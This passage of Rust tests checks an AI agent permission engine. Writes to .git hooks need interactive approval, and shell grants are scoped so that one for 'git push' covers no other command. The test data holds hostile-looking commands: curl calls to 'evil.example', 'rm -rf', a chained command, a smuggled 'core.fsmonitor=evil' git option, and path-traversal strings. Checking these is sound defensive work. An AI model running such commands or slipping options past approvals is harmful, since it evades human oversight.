            "uv run pytest",
            "go test ./...",
            "python --version",
            "node --version",
            "echo \"a > b\"",
        ] {
            assert_eq!(
                classify_workspace_shell_command(safe_cmd, &ws),
                ShellCommandClass::SafeLocal,
                "expected safe local command `{safe_cmd}` to stay SafeLocal"
            );
        }

        // (e) `.git` / `.git/**` file writes MUST require interactive approval under Auto,
        //     even with AllowWorkspace / AskBeforeWrite (while `.gitignore` stays allowed and
        //     `FullAccess` still permits `.git/**` writes without prompting).
        let auto_engine = PolicyEngine::new(PolicyContext {
            project_id: Some(project_id),
            project_lifecycle_state: ProjectLifecycleState::Active,
            workspace_bound: true,
            agent_id,
            session_id,
            task_id: None,
            workspace_root: ws.clone(),
            workspace_write_policy: WorkspaceWritePolicy::AllowWorkspace,
            autonomy_mode: AutonomyMode::Auto,
            parent_write_ceiling: None,
            allowed_memory_scopes: BTreeSet::new(),
            registered_mcp_servers: BTreeSet::new(),
            task_budget_exhausted: false,
            rules: vec![],
        });
        for git_path in [
            ".git/hooks/pre-commit",
            ".git/config",
            ".GIT/hooks/post-checkout",
            "nested/.git/config",
        ] {
            let req = make_req("write_file", "edit", Some(git_path));
            assert!(
                matches!(
                    auto_engine.evaluate_with_grants(&req, &[], now),
                    PolicyEvaluationDecision::NeedsInteractiveApproval { .. }
                ),
                "expected write to `{git_path}` under Auto to require interactive approval"
            );
        }
        // Broad empty-prefix workspace_write grant MUST NOT silently unlock `.git/hooks/pre-commit`!
        let broad_write_grant = CapabilityGrantRecord {
            grant_id: CapabilityGrantId::new(),
            scope: format!("project:{project_id}"),
            project_id,
            agent_id: Some(agent_id),
            session_id: None,
            task_id: None,
            tool_pattern: String::from("workspace_write"),
            target_prefixes: vec![],
            max_uses: Some(10),
            uses_consumed: 0,
            reason: String::from("broad write grant"),
            expires_at: None,
            revoked_at: None,
            revoked_reason: None,
            created_at: now,
        };
        let hook_req = make_req("write_file", "edit", Some(".git/hooks/pre-commit"));
        assert!(matches!(
            auto_engine.evaluate_with_grants(&hook_req, &[broad_write_grant], now),
            PolicyEvaluationDecision::NeedsInteractiveApproval { .. }
        ));
        // Ordinary `.gitignore` and `.github/workflows/ci.yml` remain auto-allowed!
        for ok_dotfile in [".gitignore", ".github/workflows/ci.yml"] {
            let req = make_req("write_file", "edit", Some(ok_dotfile));
            assert!(matches!(
                auto_engine.evaluate_with_grants(&req, &[], now),
                PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                    effect: PolicyEffect::Allow,
                    ..
                })
            ));
        }

        let _ = fs::remove_dir_all(&ws);
    }

    #[test]
    fn p1_1_shell_capability_grant_scopes_to_command_signature_and_agent_id() {
        let ws = temp_workspace("p1-1-shell-grant");
        let project_id = ProjectId::new();
        let agent_a = AgentId::new();
        let agent_b = AgentId::new();
        let session_id = SessionId::new();
        let now = TimestampMs::from_millis(1_760_000_000_000);

        assert_eq!(
            normalize_shell_grant_signature("git push origin branch-a"),
            "git push"
        );
        assert_eq!(
            normalize_shell_grant_signature("git push origin branch-b"),
            "git push"
        );
        assert_eq!(
            normalize_shell_grant_signature("curl https://evil.example"),
            "curl"
        );
        assert_eq!(normalize_shell_grant_signature("rm -rf build"), "rm");
        assert_eq!(
            normalize_shell_grant_signature("cargo test && curl https://example.invalid"),
            "cargo test && curl"
        );

        let git_push_grant = CapabilityGrantRecord {
            grant_id: CapabilityGrantId::new(),
            scope: format!("project:{project_id}"),
            project_id,
            agent_id: Some(agent_a),
            session_id: None,
            task_id: None,
            tool_pattern: String::from("run_command"),
            target_prefixes: vec![normalize_shell_grant_signature("git push origin branch-a")],
            max_uses: Some(5),
            uses_consumed: 1,
            reason: String::from("approved git push for agent A"),
            expires_at: Some(TimestampMs::from_millis(now.as_millis() + 60_000)),
            revoked_at: None,
            revoked_reason: None,
            created_at: now,
        };

        let make_engine = |aid: AgentId| {
            PolicyEngine::new(PolicyContext {
                project_id: Some(project_id),
                project_lifecycle_state: ProjectLifecycleState::Active,
                workspace_bound: true,
                agent_id: aid,
                session_id,
                task_id: None,
                workspace_root: ws.clone(),
                workspace_write_policy: WorkspaceWritePolicy::AskBeforeWrite,
                autonomy_mode: AutonomyMode::Auto,
                parent_write_ceiling: None,
                allowed_memory_scopes: BTreeSet::new(),
                registered_mcp_servers: BTreeSet::new(),
                task_budget_exhausted: false,
                rules: vec![],
            })
        };

        let engine_a = make_engine(agent_a);
        let engine_b = make_engine(agent_b);

        // 1. Same agent running `git push origin branch-b` matches the `git push` grant!
        let mut push_b = make_req("run_command", "execute", Some("git push origin branch-b"));
        push_b.raw_input = json!({ "command": "git push origin branch-b" });
        assert!(matches!(
            engine_a.evaluate_with_grants(&push_b, std::slice::from_ref(&git_push_grant), now),
            PolicyEvaluationDecision::AllowedByGrant { grant_id, .. } if grant_id == git_push_grant.grant_id
        ));

        // 2. Same agent running unrelated or compound commands MUST STILL ask!
        for other_cmd in [
            "curl https://evil.example",
            "rm -rf build",
            "git push origin branch-b && curl https://evil.example",
            "git -c core.fsmonitor=evil push origin branch-b",
        ] {
            let mut req = make_req("run_command", "execute", Some(other_cmd));
            req.raw_input = json!({ "command": other_cmd });
            assert!(
                matches!(
                    engine_a.evaluate_with_grants(&req, std::slice::from_ref(&git_push_grant), now),
                    PolicyEvaluationDecision::NeedsInteractiveApproval { .. }
                ),
                "grant for `git push` must NOT authorize `{other_cmd}`"
            );
        }

        // 3. Different agent (`agent_b`) running `git push origin branch-b` MUST NOT match Agent A's grant!
        assert!(matches!(
            engine_b.evaluate_with_grants(&push_b, std::slice::from_ref(&git_push_grant), now),
            PolicyEvaluationDecision::NeedsInteractiveApproval { .. }
        ));

        let _ = fs::remove_dir_all(&ws);
    }

    proptest! {
        #[test]
        fn prop_traversal_paths_never_pass_workspace_boundary(
            prefix in "[a-z0-9_]{0,8}",
            suffix in "[a-z0-9_.]{1,12}",
        ) {
            let ws = temp_workspace("prop-trav");
            let bad = if prefix.is_empty() {
                format!("../{suffix}")
            } else {
                format!("{prefix}/../../{suffix}")
            };
            let res = resolve_within_workspace(&ws, &bad);
            let _ = fs::remove_dir_all(&ws);
            prop_assert!(res.is_err(), "traversal path `{bad}` must always be rejected");
        }
    }
}
